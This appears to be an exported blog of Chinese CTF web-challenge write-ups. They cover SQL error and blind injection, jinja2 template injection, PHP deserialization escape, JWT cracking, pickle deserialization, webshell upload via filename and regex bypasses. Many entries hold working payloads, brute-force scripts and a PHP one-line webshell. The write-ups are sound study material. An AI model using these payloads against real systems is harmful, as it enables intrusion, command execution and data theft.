    <content type="text"><![CDATA[考点二次报错注入 解题过程打开 两个功能，登录和注册 先注册 用admin作为账户名注册的时候提示，user exists! 可以知道admin账号存在，先不管，用root作为账户名注册。 注册并登录成功 点击root超链接，发现里面存在一个修改密码的功能 接下来尝试用 admin&quot;# 的方式修改admin密码。 流程 第一步：先以 admin”# 为账户名注册 第二步：登录 admin”# 账户 第三步：修改 密码 发现可以修改admin账户名的登录密码，但是并没有什么用，flag也没有藏在个人信息里，但是可以知道的是，更改密码那里存在sql注入漏洞。 接下来 通过翻开源代码可以知道，更改密码那会将错误信息输出。 构造payload 先注册页面提交 1test&quot;||updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;password=test&amp;email=123 登录并点开修改密码提交一次 成功拿到数据库表 拿数据库表 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)# article,flag,users 拿列名 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)),0x7e),1)# XPATH syntax error: ‘~name,pwd,email,real_flag_1s_her’ 发现并没有获取完，学到一个新姿势。 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x7e),1)# 这里如果是放在bp里提交有个小问题，&amp;&amp;后边的内容会提交不上，解决方式就是将&amp;&amp;url编码成%26%26 查值 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x7e),1)# 出现问题，未显示完，用reverse函数逆序输出 1test&quot;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;))),0x7e),1)# python一下 123s = &quot;~&#125;8e548f769e29-07c9-1c44-5196-67&quot;print(s[::-1])# 76-6915-44c1-9c70-92e967f845e8&#125;~ 拼接一下，就得到 1flag&#123;8b8f6676-6915-44c1-9c70-92e967f845e8&#125; 总结这道题，凭借自己能力，只能达到修改admin用户名那一步，还是太菜，后边都是看别的师傅wp，这道题又巩固了一次二次注入的做题经验，又学到了报错注入未显示完整的内容显示出来的姿势。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CSCCTF 2019 Qual】FlaskLight 1]]></title>
    <url>%2F2021%2F08%2F16%2F%5BCSCCTF%202019%20Qual%5DFlaskLight%201%2F</url>
    <content type="text"><![CDATA[考点jinja2的ssti注入 解题过程打开 在源代码中 通过下面payload判断是否存在模板注入 1?search=&#123;&#123;4*4&#125;&#125; 确定漏洞类型存在模板注入 试了常规的命令执行payload，发现都是返回500服务器错误。 1&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;ls&apos;).read()&quot;)&#125;&#125; 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &apos;eval&apos; in b.keys() %&#125; &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 无奈之下，找到一名大师傅写的脚本 12345678910111213141516171819202122import requestsimport reimport htmlimport timeindex = 0for i in range(170, 1000): try: url = "http://d08b15b4-f7c1-4129-9083-3fc9d50a2c5f.node4.buuoj.cn:81?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]&#125;&#125;" r = requests.get(url) res = re.findall("&lt;h2&gt;You searched for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;", r.text) time.sleep(0.1) # print(res) # print(r.text) res = html.unescape(res[0]) print(str(i) + " | " + res) if "subprocess.Popen" in res: index = i break except: continueprint("indexo of subprocess.Popen:" + str(index)) 这个脚本的功能是查找可以执行命令的类，查找条件subprocess.Popen。 接下来通过大师傅给的payload 12345?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125; 成功打通。 总结对模板注入还不够了解，不会构造payload，更不会bypass，只能拿着别人的payload或者工具来做题，这类题得多做，payload要会自己构造。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI(jinja2)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku-WEB newphp]]></title>
    <url>%2F2021%2F08%2F08%2Fbugku-newphp%2F</url>
    <content type="text"><![CDATA[考点反序列化字符串逃逸 ssrf 解题思路分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php// php版本:5.4.44header("Content-type: text/html; charset=utf-8");highlight_file(__FILE__);class evil&#123; public $hint; public function __construct($hint)&#123; $this-&gt;hint = $hint; &#125; public function __destruct()&#123; if($this-&gt;hint==="hint.php") @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint)); var_dump($this-&gt;hint); &#125; function __wakeup() &#123; if ($this-&gt;hint != "╭(●｀∀´●)╯") &#123; //There's a hint in ./hint.php $this-&gt;hint = "╰(●’◡’●)╮"; &#125; &#125;&#125;class User&#123; public $username; public $password; public function __construct($username, $password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;function write($data)&#123; global $tmp; $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data); $tmp = $data;&#125;function read()&#123; global $tmp; $data = $tmp; $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $data); return $r;&#125;$tmp = "test";$username = $_POST['username'];$password = $_POST['password'];$a = serialize(new User($username, $password));if(preg_match('/flag/is',$a)) die("NoNoNo!");unserialize(read(write($a))); 一般看到有unserialize函数，基本上就知道是反序列化类型的题，审计代码的时候首先找到利用的点。 在evil类的__destruct方法中 12345678public function __destruct()&#123; # $this-&gt;hint 必须为hint.php if($this-&gt;hint==="hint.php") # 读取文件hint.php内容 并且base64编码 重新赋值给$this-&gt;hint @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint)); # 输出 var_dump($this-&gt;hint); &#125; 目的很明确，我们需要通过反序列化evil类来读取hint.php文件查看提示，先在自己搭建环境构造序列化字符串。 得到反序列化字符串 1O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125; 找到可以执行反序列化的地方。 123456789$tmp = "test";$username = $_POST['username'];$password = $_POST['password'];$a = serialize(new User($username, $password));if(preg_match('/flag/is',$a)) die("NoNoNo!");unserialize(read(write($a))); 可以看到这里并不能直接对evil类进行序列化，首先POST接收了两个参数，然后通过两个参数创建了User类，并且进行了序列化，最后通过write和read函数进行替换后才进行反序列化。 关键点就在这两个函数，这两个函数是造成字符串逃逸的关键因素。 12345678910111213function write($data)&#123; global $tmp; $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data); $tmp = $data;&#125;function read()&#123; global $tmp; $data = $tmp; $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $data); return $r;&#125;# write方法会将 带有*的字符串替换成 \0\0\0 而read方法则相反，会将\0\0\0 替换成* 可以看到\0\0\0会被替换成*，那在反序列化之前使用这两个函数会有什么问题呢？ 首先通过username和password 进行传参，并把刚刚序列化得到的字符串传入进去。 如果直接这样传入进去，后边的O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}就会被丢弃，O:4:&quot;User&quot;:2 。O代表着对象，4代表对象名的字符长度，User就是对象名，2就代表着有两个属性，2个属性就只会读取O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;123&quot;;s:8:&quot;password&quot;;， 后边的就会被丢弃。 这里我们可以利用字符串替换进行逃逸，我们传入一组 \00\00\00 没被替换前得到 1O:4:"User":2:&#123;s:8:"username";s:6:"\0\0\0";s:8:"password";s:41:"O:4:"evil":1:&#123;s:4:"hint";s:8:"hint.php";&#125;";&#125; 经过write和read替换后 1O:4:"User":2:&#123;s:8:"username";s:6:"*";s:8:"password";s:41:"O:4:"evil":1:&#123;s:4:"hint";s:8:"hint.php";&#125;";&#125; 可以发现变成了s:6:&quot;*&quot;; 这样会意味着 这里要吃掉 *&quot;;s:8 变成 *&quot;;s:8 ，但是后边没有闭合，所以会出错。如果我们想逃逸出O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}&quot;;}，那就必须吃掉 &quot;;s:8:&quot;password&quot;;s:41:&quot;这23个字符，而一组\0\0\0 能吃掉三个，这三个字符由chr(0).&#39;*&#39;.chr(0) 组成的三个，那么就需要8组\0\0\0 ，这样就得到24个，另外再由password加上一个任意字符凑齐24个，将evil的属性个数改为2绕过__wakeup方法检测。 payload 1username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a";O:4:"evil":2:&#123;s:4:"hint";s:8:"hint.php";&#125; 得到base64编码的字符串 12345PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo=解码&lt;?php $hint = &quot;index.cgi&quot;; // You can&apos;t see mefgo 访问index.cgi ssrf 获取flag的payload 1http://114.67.246.176:17691/index.cgi?name=%20file:///flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web5】CyberPunk 1]]></title>
    <url>%2F2021%2F05%2F11%2F%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk%201%2F</url>
    <content type="text"><![CDATA[考点：文件包含、二次注入、sql注入读取文件这道题本来打算自己折腾出来的，把源代码包含出来后，一直审计，起初，根本没发现是二次注入，一直在想办法绕过addslashes 和 怎么绕过正则，正则过滤了很多sql注入的关键字，只能检测有sql注入漏洞，但根本不可能查到数据。就是在这上面下的功夫比较多。最后才发现，文件change.php 有一个查询sql语句，带入查询的sql语句关键字被过滤了，在查询出来的基础上，紧接着有一条更新语句，更新语句是有一个条件是从数据库中取出，也就是$row[&#39;address&#39;] ，然后找到这个$row[&#39;address&#39;] 插入的地方，也就是首页index.php ，后台处理是 confirm.php， 发现没有处理 $address，于是就知道这个题考的二次注入。知道以后，可以查询表名，字段名，就是查不到字段值，网上找个了遍，群里也问了哪些大佬，都没有得到结果，最后才看来wp，发现flag根本不在数据库中，而是在 /falg.txt 中，简直人傻了。 分析主页上一个关键的地方，可以用文件包含出几个文件的源代码。 payload 1?file=php://filter/read=convert.base64-encode/resource=index.php confirm.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &apos;&apos;; $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;; $user_name = $_POST[&quot;user_name&quot;]; # 这里接收address $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; # if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &apos;no sql inject!&apos;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name.&quot;å·²æäº¤è®¢å&quot;; &#125;else&#123; # 这里会将address 插入到数据库中 # 这里使用了预处理 不存在sql注入 $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo &apos;error&apos;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢åæäº¤æå&quot;; &#125;&#125; else &#123; $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;&#125;?&gt; change.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &apos;&apos;; $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;; $user_name = $_POST[&quot;user_name&quot;]; # 这里会接收 address 参数 特殊字符会被addslashes 转义 $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &apos;no sql inject!&apos;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); # 这里会把刚接收的 address 更新 到 address 字段中 # 会把查询出来的address 更新到 old_address 字段中 # 这里传入的 address 已经被 addslashes 构造不了 单引号闭合 # 而这里的 $row[&apos;address&apos;] 是从数据库中取出 # 而刚刚的confirm.php文件并没有处理address 参数 # 这里会存在二次注入 $sql = &quot;update `user` set `address`=&apos;&quot;.$address.&quot;&apos;, `old_address`=&apos;&quot;.$row[&apos;address&apos;].&quot;&apos; where `user_id`=&quot;.$row[&apos;user_id&apos;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &apos;error&apos;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢åä¿®æ¹æå&quot;; &#125; else &#123; $msg = &quot;æªæ¾å°è®¢å!&quot;; &#125;&#125;else &#123; $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;&#125;?&gt; 贴了两个关键文件的代码，总共有四个功能提交订单 查询订单 修改订单 删除订单 漏洞出现在提交订单 和 修改订单当中，直接构造payload。 payload 查数据库 1aa' or updatexml(2,concat(0x7e,(database())),0) or' 加载flag文件 1aa' or updatexml(2,concat(0x7e,(select load_file('/flag.txt'))),0) or' 读不完 一次 1234# 一次aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),10,40))),0) or'# 两次aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),20,50))),0) or' 测试把查数据库的payload提交上去 再修改订单信息 成功的拿到了数据库名 接下来直接读flag，为什么不是放在数据库中，我也是不断的读取字段名，读了差不多20多个字段名，一直读不完，才去看别人wp，发现要用load_file 去读 /flag.txt 文件。 提交 修改 拿到flag，但是并没有全拿到。 再读一次，就拿到后半段。 1aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),20,50))),0) or' update 注入：https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【Zer0pts2020】Can you guess it 1]]></title>
    <url>%2F2021%2F05%2F06%2F%5BZer0pts2020%5DCan%20you%20guess%20it%201%2F</url>
    <content type="text"><![CDATA[考点：代码审计、正则绕过、basename缺陷打开123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude &apos;config.php&apos;; // FLAG is defined in config.phpif (preg_match(&apos;/config\.php\/*$/i&apos;, $_SERVER[&apos;PHP_SELF&apos;])) &#123; exit(&quot;I don&apos;t know what you are thinking, but I won&apos;t let you read it :)&quot;);&#125;if (isset($_GET[&apos;source&apos;])) &#123; highlight_file(basename($_SERVER[&apos;PHP_SELF&apos;])); exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&apos;guess&apos;])) &#123; $guess = (string) $_POST[&apos;guess&apos;]; if (hash_equals($secret, $guess)) &#123; $message = &apos;Congratulations! The flag is: &apos; . FLAG; &#125; else &#123; $message = &apos;Wrong.&apos;; &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;/h1&gt; &lt;p&gt;If your guess is correct, I&apos;ll give you the flag.&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt; &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;&lt;?php &#125; ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 分析题目直接给出了源代码，通过分析，可以得到两段代码。先看看下半段。 123456789101112# 随机生成64位二进制字节，再转换位十六进制 赋值给$secret$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) &#123; $guess = (string) $_POST['guess']; # hash_equals 可防止时序攻击的字符串比较 # 如果传入字符串长度和随机生成的字符串长度不一样 直接 false if (hash_equals($secret, $guess)) &#123; $message = 'Congratulations! The flag is: ' . FLAG; &#125; else &#123; $message = 'Wrong.'; &#125;&#125; 这段代码，是想让我们传入字符串，要求字符串与随机生成的字符串一样，那么才会输出flag。几乎不太可能。 分析上半段代码。 1234567891011# $_SERVER['PHP_SELF'] 是获取url中域名后边的部分 www.xxx.com/index.php/config.php 就是获取 index.php/config.php# 这里的正则直接就是匹配 config.php/ 不允许这样的结尾 if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) &#123; exit("I don't know what you are thinking, but I won't let you read it :)");&#125;# 如果传入的是 /index.php/config.php 那么 basename 取到的就是config.php if (isset($_GET['source'])) &#123; highlight_file(basename($_SERVER['PHP_SELF'])); exit();&#125; 如果通过highlight_file去读取config.php 文件，这段代码看起来好像是不太行，通过传入 /index.php/config.php 会被正则直接拦下来。但是basename 这个函数有个小小的问题，就是文件名首尾任何非ASCII码的字符都会被rename函数删除掉。官网https://bugs.php.net/bug.php?id=62119。 12345678910111213141516171819$path='/test/äaä.txt';echo $path."\n";setlocale(LC_ALL,'C');echo dirname($path).'/'.basename($path)."\n";setlocale(LC_ALL,'en_US.iso885915'); // bash: locale -aecho dirname($path).'/'.basename($path)."\n";Expected result:----------------/test/äaä.txt/test/äaä.txt/test/äaä.txtActual result:--------------/test/äaä.txt/test/aä.txt/test/äaä.txt 构造payload 1/index.php/config.php/%e4/?source 首先浏览器会去请求index.php这个文件，正则会匹配/index.php/config.php/%e4/ ，末尾不满足正则表达式的规则，不会被拦截，到rename这，会把%e4，也就是 ä，这个非ASCII码字符丢弃掉，只会拿到config.php，所以highlight_file就成功读取到了config.php文件 得到]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web2】ikun 1]]></title>
    <url>%2F2021%2F04%2F29%2F%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun%201%2F</url>
    <content type="text"><![CDATA[考点：JWT伪造爆破页面爆破页面的方式查找lv6.png 1234567891011import requestsfor i in range(1,500): url = "http://c3b3fa1b-d3f7-46e3-87aa-cd780610904c.node3.buuoj.cn/shop?page=%d"%(i) resp = requests.get(url, timeout=10) if "lv6.png" in resp.text: print("[+]" + str(i)) break print(i)# page=181 找到 JWT伪造要伪造JWT，首先要知道密钥，通过工具 jwt-cracker 下载连接：https://github.com/brendan-rius/c-jwt-cracker 12└─$ ./jwtcrack &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.l0qG4XbJbemqJXsaITaT8g78fkJ-boRvU2H7H1CY644&quot;Secret is &quot;1Kun&quot; 打开 https://jwt.io/ python反序列化序列化构建payload 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, ("open('/flag.txt', 'r').read()",)) a = pickle.dumps(payload())a = urllib.quote(a)print a 1c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%20%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. 这道题，在没看wp之前，我以为是需要用1000块钱把所有的商品买光，把资金筹集够，然后会有相应提示或者输出flag。在优惠折扣那存在一个漏洞，可以修改值大小。修改得越小，花的钱就越少，就通过burp suite 得 intruder 购买了所有商品，结果发现还是回显什么。总之，这道题很多知识点都超出了我的认知。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化(Python)</tag>
        <tag>JWT伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 总决赛 Day2 Web1】Easyweb 1]]></title>
    <url>%2F2021%2F04%2F25%2F%5BCISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day2%20Web1%5DEasyweb%201%2F</url>
    <content type="text"><![CDATA[考点：备份文件泄漏、sql盲注、绕过php字符文件上传打开 一个普普通通的登录框，查看源代码，图片是通过请求 image.php?id=1 的方式得到的。测试了下，好像只会显示图片和不显示图片，只要发现有登录框的题，都会测试sql注入，和扫目录。sql注入，没有明显报错，扫描目录的结果如下。 发现 robots.txt image.php.bak 关键信息 打开 robots.txt 关键信息 *.php.bak 下载 image.php.bak 得到一份image.php 的源码 1234567891011121314151617181920&lt; ?phpinclude "config.php";$id=isset($_GET["id"])?$_GET["id"]:"1";$path=isset($_GET["path"])?$_GET["path"]:"";# addslashes$id=addslashes($id);$path=addslashes($path);# 一般 addslashes 和 str_replace 放在一起 有可能照成 某些字符逃逸# str_replace 将 字符串中带有 \0 %00 \' \ 替换成 '$id=str_replace(array("\\0","%00","\\'","'"),"",$id);$path=str_replace(array("\\0","%00","\\'","'"),"",$path);$result=mysqli_query($con,"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path="./" . $row["path"];header("Content-Type: image/jpeg");readfile($path); 简化代码 12345678910&lt;?php $id = $_GET['code']; //\0' echo $id; echo "&lt;br/&gt;"; $id = addslashes($id); // \\0\' echo "addslashes:".$id; # \0 为结束符 空字符 \ ' 替换成 '' $id = str_replace(array("\\0", "%00", "\\'", "'"), "", $id); echo '&lt;br/&gt;'; echo $id; 1234567// $code=&apos;&apos;addslashes:\&apos;// $code=\0addslashes:\\0\ 当我输入 \0 ，addslashes函数会将 \0 转换成 \\0 ， 在经过str_replace的替换 ，就会逃逸出一个\。这个斜杠会照成什么危害呢，接下来把这个\ 拼接到sql语句中。 12345# $result=mysqli_query($con,"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);# 拼接逃逸的 \ 后 $result=mysqli_query($con,"select * from images where id='\' or path='&#123;$path&#125;'"); 可以看到 &quot;select * from images where id=&#39;\&#39; or path=&#39;{$path}&#39;&quot; 中的 &#39; 被转义 成了 \&#39;，id的值就变成了 \&#39; or path= ，后面的 $path 可控。 直接构建payload 1?id=\0&amp;path= or 1=1 --+ 完整的sql查询语句 1select * from images where id='\' or path=' or 1=1 --+' id值成了 \&#39; or path= 可控部分为 or 1=1 --+ --+ 注释掉了后面单引号。 需要注意的地方是 or 前边需要留一个空格，不然会挨在id值后面，导致语法失效。 接下来进行利用 sql盲注构建payload 12345678# 查表名or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=%s)--+[+] image,users# 查列名or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),1,1))=%s)--+# 0x7573657273 是 字符串转16进制的 users 因为过滤了 ' [+] username,password# 查值 上脚本 1234567891011121314151617181920212223242526272829303132import requestsurl='http://d8d00e0d-6636-4e83-a4fb-fb6078f71755.node3.buuoj.cn/image.php?id=\\0&amp;path='flag=''for i in range(50): a = 32 b = 128 mid = (a+b)//2 while(a&lt;b): # or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%s)--+ 爆表名 # or (ascii(substr((select(group_concat(column_name)))from(information_schema.columns)where(table_name=0x7573657273)),%d,1))&gt;%s)--+ 爆列名 # print(mid) payload = url+"or (ascii(substr((select(group_concat(username,password))from(users)),%d,1))&gt;%s)--+"%(i,mid) import time time.sleep(1) re = requests.get(url=payload) # 首先判断目标值 是否小于 if 'JFIF' in re.text: a = mid + 1 else: # 目标值 大于 则直接 将 mid 赋值给 b b = mid mid = (a+b)//2 # if (mid==32|mid==128): break flag +=chr(mid) print("[+] " + flag) 还是别人写的脚本优雅，自己写的要提交两次。 结果 用户名 admin 密码 abd0ad13f4eed251de2c 登录 绕过php字符文件上传，文件名写马经过几经尝试，可以上传除php以外的文件，就是传入的文件名和后缀中不能存在 php，上传后不会给上传到的文件路径，但是会回显下边这样的一个记录。 打开 这个文件记录了上传的文件名。 那么思路就是，通过修改上传文件的文件名为一句话木马，然后访问这个文件进行利用，这里的文件名不能存在 php 字样，用php短标签代替。 一个小知识 PHP开启short_open_tag=on，即可使用短标签 payload 1&lt;=eval($_POST['cmd']);?&gt; 访问]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>备份文件泄露</tag>
        <tag>SQL盲注</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【FBCTF2019】RCEService 1]]></title>
    <url>%2F2021%2F04%2F24%2F%5BFBCTF2019%5DRCEService%201%2F</url>
    <content type="text"><![CDATA[考点：正则PCRE回溯匹配绕过、换行绕过打开 123456789101112131415161718192021222324&lt;?php# 设置当前php文件运行的环境变量putenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) &#123; $json = $_REQUEST['cmd']; if (!is_string($json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; else &#123; echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo 'Invalid input'; &#125; echo '&lt;br/&gt;&lt;br/&gt;'; &#125;&#125;?&gt; 这道题有些问题，源码是从别人wp来的，但是别人也没说源码怎么来的。 不管怎么样，这道题学到了绕过preg_match正则匹配的两种方式。 第一种方式 PCRE回溯绕过 p神讲得很好https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html 这里直接贴脚本 123456789import requestsurl = "http://3f0c0ea0-47c8-4ae8-8f1c-dcd5c21ec12d.node3.buuoj.cn"payload = '&#123;"cmd": "/bin/cat /home/rceservice/flag", "zz": "'+"a"*(1000000)+'"&#125;'res = requests.post(url, data=&#123;"cmd": payload&#125;, timeout=10)print(res.text) 第二种方式 换行绕过 payload 12POST：cmd=&#123;%0a&quot;cmd&quot;%3a+&quot;/bin/cat+/home/rceservice/flag&quot;%0a&#125; 这道题处于懵懂状态。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【WUSTCTF2020】颜值成绩查询 1]]></title>
    <url>%2F2021%2F04%2F22%2F%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%201%2F</url>
